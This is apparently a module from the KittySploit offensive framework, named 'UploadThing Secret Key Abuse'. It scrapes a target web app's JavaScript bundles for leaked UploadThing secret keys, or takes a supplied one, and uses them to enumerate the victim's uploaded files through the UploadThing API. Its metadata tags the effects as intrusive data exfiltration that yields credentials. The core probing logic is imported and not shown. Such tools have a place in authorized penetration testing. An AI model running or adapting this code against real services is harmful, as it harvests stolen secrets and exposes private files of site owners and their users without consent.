#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Abuse leaked UploadThing secret keys to list uploaded files."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.uploadthing_probe import enumerate_uploadthing
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "UploadThing Secret Key Abuse",
        "description": (
            "Uses leaked UploadThing sk_live_/sk_test_ keys to list files and usage "
            "via the UploadThing v6 API. Auto-discovers from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["uploadthing", "storage", "files", "enumeration", "auxiliary", "nocode"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    secret_key = OptString("", "UploadThing secret key (sk_live_… / sk_test_…)", False)
    auto_discover = OptBool(True, "Scrape SPA for UploadThing credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")

        self._configure_session()
        findings, creds = enumerate_uploadthing(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            secret_key=str(self.secret_key or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No UploadThing API access (set secret key or enable auto_discover)")
            return False

        for hit in ok:
            print_success(f"UploadThing {hit.get('kind')}: {hit.get('file_count', '?')} file(s)")

        self.set_info(
            severity="critical",
            reason=f"UploadThing enum: {len(ok)} accessible endpoint(s)",
            findings=findings,
            credentials={k: mask_secret(v) for k, v in creds.items()},
        )
        return True
